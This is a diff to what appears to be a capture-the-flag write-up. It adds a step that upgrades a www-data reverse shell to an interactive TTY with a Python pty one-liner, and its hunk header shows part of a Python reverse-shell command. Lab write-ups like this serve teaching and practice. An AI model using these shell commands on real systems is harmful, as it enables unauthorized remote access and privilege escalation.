@@ -216,7 +216,11 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 
 ![image](https://user-images.githubusercontent.com/53917092/94917382-d0320580-0486-11eb-9539-88e8bd9e5e22.png)
 
-(on the right screen we have the good shell)
+(on the right screen we have the good shell, but not a tty)
+
+to have a tty, run the command :
+
+> python -c 'import pty;pty.spawn("/bin/bash")'
 
 now we have to try to get access to some user (www-data dont have acess to the user flag)
 
